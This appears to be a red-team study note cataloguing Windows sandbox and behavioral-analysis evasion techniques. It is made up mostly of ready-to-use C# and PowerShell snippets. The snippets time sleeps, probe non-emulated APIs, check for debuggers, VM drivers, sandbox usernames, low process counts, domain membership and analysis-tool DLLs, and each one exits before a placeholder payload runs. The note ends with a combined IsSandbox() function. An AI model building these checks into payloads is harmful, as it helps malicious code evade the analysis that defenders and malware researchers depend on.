---
tags:
  - Defense_Evasion
  - Foundational
  - Windows
---

## Behavioral Evasion Techniques
resources: [CheckPlz GitHub](https://github.com/antonioCoco/CheckPlz)

> [!info] Evade sandbox analysis and behavioral detection through timing, environment checks, and API selection.

### Simple Sleep Timers

> [!tip] Sandboxes often have time limits. Sleeping can bypass analysis windows.

#### C# Sleep Before Execution
```csharp
// Sleep for 10 seconds before payload
DateTime start = DateTime.Now;
System.Threading.Thread.Sleep(10000);
double elapsed = DateTime.Now.Subtract(start).TotalSeconds;

// Verify sleep actually occurred (sandbox detection)
if (elapsed < 9.5)
{
    return; // Sandbox accelerated time - exit
}

// Execute payload
```

#### PowerShell Sleep
```powershell
Start-Sleep -Seconds 120
# Payload here
```

### Non-Emulated API Calls

> [!tip] Use APIs that sandboxes don't fully emulate. If API behaves unexpectedly, likely in sandbox.

#### VirtualAllocExNuma
> [!info] NUMA-aware allocation. Many sandboxes don't emulate NUMA properly.

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

// If returns null on single-CPU system without error, likely sandbox
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x04, 0);
if (mem == IntPtr.Zero)
{
    return; // Sandbox detected
}
```

#### FlsAlloc
> [!info] Fiber Local Storage allocation.

```csharp
[DllImport("kernel32.dll")]
static extern uint FlsAlloc(IntPtr lpCallback);

uint fls = FlsAlloc(IntPtr.Zero);
if (fls == 0xFFFFFFFF)
{
    return; // Sandbox detected
}
```

### Environment Checks

#### Check for Debugger
```csharp
[DllImport("kernel32.dll")]
static extern bool IsDebuggerPresent();

if (IsDebuggerPresent())
{
    return; // Debugger detected
}
```

#### Check Process Count
> [!tip] Real systems have many processes. Sandboxes often have few.

```csharp
if (System.Diagnostics.Process.GetProcesses().Length < 50)
{
    return; // Likely sandbox
}
```

#### Check for VM Artifacts
```csharp
// Check for VM-related files
if (System.IO.File.Exists(@"C:\Windows\System32\drivers\vmmouse.sys"))
{
    return; // VMware detected
}

// Check for sandbox usernames
string user = Environment.UserName.ToLower();
string[] sandboxUsers = { "sandbox", "malware", "virus", "sample", "test" };
foreach (string s in sandboxUsers)
{
    if (user.Contains(s)) return;
}
```

#### Check Domain Membership
```csharp
// Most sandboxes aren't domain-joined
try
{
    System.DirectoryServices.ActiveDirectory.Domain.GetComputerDomain();
}
catch
{
    return; // Not domain-joined, might be sandbox
}
```

### Memory Artifact Checks

#### Check for Specific DLLs
```csharp
// Sandbox analysis tools often inject DLLs
string[] badDlls = { "sbiedll.dll", "api_log.dll", "dir_watch.dll", "pstorec.dll" };
foreach (ProcessModule mod in Process.GetCurrentProcess().Modules)
{
    foreach (string bad in badDlls)
    {
        if (mod.ModuleName.ToLower() == bad)
            return; // Sandbox detected
    }
}
```

### Combining Techniques
```csharp
static bool IsSandbox()
{
    // Check sleep timing
    DateTime t1 = DateTime.Now;
    Thread.Sleep(2000);
    if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return true;

    // Check process count
    if (Process.GetProcesses().Length < 50) return true;

    // Check for debugger
    if (IsDebuggerPresent()) return true;

    // Check username
    string user = Environment.UserName.ToLower();
    if (user.Contains("sandbox") || user.Contains("malware")) return true;

    return false;
}
```
